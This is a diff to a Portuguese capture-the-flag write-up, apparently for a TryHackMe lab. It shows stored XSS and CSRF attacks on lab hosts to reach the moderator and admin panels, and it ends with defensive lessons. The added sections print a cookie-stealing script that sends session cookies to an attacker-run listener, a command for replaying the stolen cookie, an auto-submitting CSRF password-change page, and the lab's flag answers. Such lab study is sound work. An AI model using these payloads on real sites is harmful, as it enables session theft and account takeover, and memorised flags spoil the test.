@@ -67,20 +67,121 @@ Feito isso, obtemos a resposta para a página em branco:
 
 <img width="1908" height="277" alt="image" src="https://github.com/user-attachments/assets/5602a248-7c7c-452f-b946-563c680cd8d7" />
 
-O desenvolvedor deixou um comentário que diz: "login.php deve ser atualizado até segunda-feira para o redirecionamento correto." Ou seja, é necessário ajustar o endereço para que seja possível acessar a página corretamente.
+O desenvolvedor deixou um comentário que diz: "login.php deve ser atualizado até segunda-feira para o redirecionamento correto." ou seja, é necessário ajustar o endereço para que seja possível acessar a página corretamente.
 
 Com isso, chegamos a essa interface:
 
 <img width="1907" height="772" alt="image" src="https://github.com/user-attachments/assets/d0a4fce5-e85b-4da6-a4be-2dd93287369a" />
 
-**Análise da primeira flag**
+## Análise da primeira flag
+
+**Contextualização**
 
 Ao chegarmos na página de login, precisaremos de um usuário válido para podermos acessar, mas além disso precisamos que o usuário seja o moderador ou o administrador para encontrarmos as flags que o desafio pede.
 
 O que acontece é: O moderador vai abrir uma página administrativa para ver a lista de novos usuários (incluindo o usuário que registrei sendo "juh"). Se colocarmos um código malicioso no cadastro, quando o moderador olhar para ele, o navegador dele vai executar o código e nos enviar o cookie dele.
 
+O motivo pelo qual precisamos do cookie do moderador é porque ele é a única maneira de acessar o painel do moderador sem saber sua senha.
+
+**Método usado**
+
+Voltando para a tela de registro, tentei rodar um script no último campo `Name` para analisar se o site aceita XSS:
+
+<img width="1897" height="725" alt="image" src="https://github.com/user-attachments/assets/fc60dbe4-de86-40e6-976b-4ed2690f216a" />
+
+Feito isso, conseguimos entender que o site não tem barreiras que invalidem os caracteres ou que tirem as tags como o `<script>`. Porém, com esse código não é possível obter nenhuma informação relevante, visto que ele só criará um aviso na tela do moderador.
+
+Como sabemos que é possível injetar scripts maliciosos, o objetivo é tentar roubar o cookie do moderador. Para isso, irei registrar outro usuário e na parte do `Name` colocarei o seguinte script: `<script>new Image().src='http://10.64.78.46:8000/?c='+document.cookie</script>`
+
+Mas antes disso, é importante criar um receptor que receberá o cookie quando o script rodar na sessão do moderador. Para isso, digitei esse comando no terminal e deixei ele rodando: `python3 -m http.server 8000`
+
+Feito isso, ao registrar uma nova conta que irá mandar o cookie do moderador para o meu terminal, temos que:
+
+<img width="824" height="522" alt="image" src="https://github.com/user-attachments/assets/27a66a85-6e2d-468e-91f0-1908ccda454c" />
+
+Porém, os cookies resetam de 1 em 1 minuto, o que dificulta o acesso caso não seja feito rapidamente.
+
+Mas é possível adicionar ao console da página de login o seguinte comando: `document.cookie="PHPSESSID=CODIGO_NOVO; path=/; domain=.worldwap.thm"; location.reload();`, que irá:
+
+* Gravar o cookie do moderador no meu navegador.
+* Recarrega a página imediatamente `(location.reload())`.
+* Garantir que o navegador entenda que esse cookie vale para todos os subdomínios.
+
+Seguindo esse passo a passo, conseguimos acessar o painel do moderador e obter a primeira flag:
+
+<img width="1897" height="767" alt="image" src="https://github.com/user-attachments/assets/fa33218c-c861-490e-b41b-e52e3cde3ee3" />
+
+## Análise da segunda flag
+
+**Contextualização**
+
+Ao analisar a página do moderador é possivel observar uma área de chat disponível e ao clicar nela temos:
+
+<img width="1902" height="772" alt="image" src="https://github.com/user-attachments/assets/93d0bbd2-eda3-4dac-9441-666ad9126921" />
+
+Ao fazer um teste enviando um link com um código para o administrador, é possível ver no terminal que ele acessou o link enviado.
+
+<img width="795" height="21" alt="Screenshot 2025-11-25 165519" src="https://github.com/user-attachments/assets/85321de2-c038-43c8-8047-7c453e74a6e3" />
+
+**Método usado**
+
+Sabendo disso, podemos utilizar a técnica de CSRF para fazer com que o admin clique no link que irá mudar automaticamente a sua senha de acesso para uma nova que determine. Para isso, é necessário descobrir como o formulário de `Change Password` funciona:
+ 
+<img width="739" height="433" alt="Screenshot 2025-11-25 164617" src="https://github.com/user-attachments/assets/a7a1c47b-ea07-42e1-9c69-831416f0f54b" />
+
+E ao inspecionar, observo os campos de senha:
+
+<img width="1898" height="726" alt="Screenshot 2025-11-25 164737" src="https://github.com/user-attachments/assets/4820c77a-c0f7-4708-9962-38ddbf390ad6" />
+
+Depois é necessário criar uma página maliciosa que irá trocar a senha do admin assim que ele acessar o link. O código usado foi esse:
+```
+<html>
+  <body>
+    <form action="http://login.worldwap.thm/change_password.php" method="POST">
+      
+      <input type="hidden" name="new_password" value="juh123">
+      
+      <input type="submit" value="Mudar Senha">
+    </form>
+    
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
+```
+<img width="1909" height="722" alt="Screenshot 2025-11-25 165114" src="https://github.com/user-attachments/assets/4392f09e-6296-4af2-ba3a-a553abb6e84f" />
+
+Como o terminal já estava rodando o comando: `python3 -m http.server 8000`, conseguimos ver novamente se o admin acessou o link enviado
+
+<img width="1066" height="34" alt="Screenshot 2025-11-25 165137" src="https://github.com/user-attachments/assets/a8290262-adcf-46d9-a2e6-cee12da73475" />
+
+O retorno foi do código 200, que significa que a solicitação foi bem-sucedida. Ou seja, a senha do administrador foi alterada e agora é só dar `Logout` na página do moderador e acessar o painel do admin usando as credenciais: `Username: Admin` e `Password: juh123`.
+
+Com isso, obtemos a segunda flag por meio de CSRF.
+
+<img width="1905" height="727" alt="Screenshot 2025-11-25 165634" src="https://github.com/user-attachments/assets/92cd272a-0e9e-4c2d-bd76-24131573b713" />
+
 ## Solução
 
+As flags encontradas para os desafios foram:
 
+Flag do painel do moderador:
+
+>`ModP@wnEd`
+
+Flag do painel do administrador:
+
+>`AdM!nP@wnEd`
 
 **Aplicação no dia a dia**
+
+A primeira vulnerabilidade se concentrava em Stored XSS, onde era possível adicionar um script ao nome do usuário, possibilitando o roubo dos cookies do moderador através do código que retornava seu valor. É importante entender essa fraqueza para que o sistema nunca salve o input do usuário sem antes valida-lo.
+
+Além disso, o ataque só funcionou porque o desenvolvedor não marcou o cookie como [`HttpOnly`](https://owasp.org/www-community/HttpOnly) permitindo que ele fosse visto e alterado pelo usuário.
+
+Já para a segunda vulnerabilidade de CSRF, foi possível enviar um link no chat que ao ser acessado pelo admin, alterava sua senha. Isso explica por que bancos e sites sérios pedem a senha antiga para a criação de uma nova.
+
+Portanto, esse desafio foi bem completo ao abordar essas vulnerabilidades para entendermos como elas funcionam e como podem ser perigosas no dia a dia.
+
+
